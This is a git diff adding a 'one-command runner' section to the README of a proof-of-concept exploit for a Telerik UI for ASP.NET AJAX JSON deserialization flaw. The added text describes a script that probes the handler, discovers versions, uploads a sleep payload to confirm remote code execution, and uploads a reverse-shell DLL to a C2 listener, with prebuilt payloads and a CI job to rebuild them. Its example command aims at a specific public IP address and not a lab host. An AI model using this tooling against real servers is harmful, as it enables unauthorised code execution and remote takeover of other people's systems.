@@ -2,6 +2,38 @@
 
 Proof-of-concept exploit for a .NET JSON deserialization vulnerability in Telerik UI for ASP.NET AJAX allowing remote code execution.
 
+## One-command runner (this fork)
+
+Everything is wired into a single script, `run.sh`, plus prebuilt payloads in
+`payloads/` (x86 + amd64, committed so no compiler is needed on the Mac).
+
+```bash
+git clone <this-repo> && cd <this-repo>
+chmod +x run.sh
+
+# handler check + version discovery + sleep-payload RCE verification:
+TARGET_URL="http://125.18.164.11:82/Telerik.Web.UI.WebResource.axd?type=rau" ./run.sh all
+```
+
+Stages: `./run.sh check | versions | exploit | shell | all`
+
+| Stage      | Does                                                              |
+|------------|-------------------------------------------------------------------|
+| `check`    | Confirms the `RadAsyncUpload` handler is registered               |
+| `versions` | Discovers the vulnerable Telerik version (RAU_crypto probes)      |
+| `exploit`  | Uploads `sleep` DLL + triggers deserialization (~10 s = RCE)      |
+| `shell`    | Uploads `revshell` DLL + triggers (start your C2 listener first)  |
+| `all`      | = `exploit`                                                       |
+
+Env vars: `TARGET_URL` (required), `PAGE_URL`, `FOLDER` (default `C:\Windows\Temp`),
+`ARCH` (`x86`/`amd64`/`both`), `VERSION` (pin, skip discovery), `REV_HOST`/`REV_PORT`
+(reverse-shell C2), `PYTHON`.
+
+A GitHub Actions job (`.github/workflows/build-dlls.yml`) rebuilds and re-commits
+the payloads on any change to the C sources, using MSVC on a Windows runner.
+
+The rest of this file is the original Bishop Fox walkthrough.
+
 <div align="center">
     <img src="https://know.bishopfox.com/hubfs/Bishop-Fox_Blog-Post_Telerik_FI_frame.png" width="300px" />
 </div>
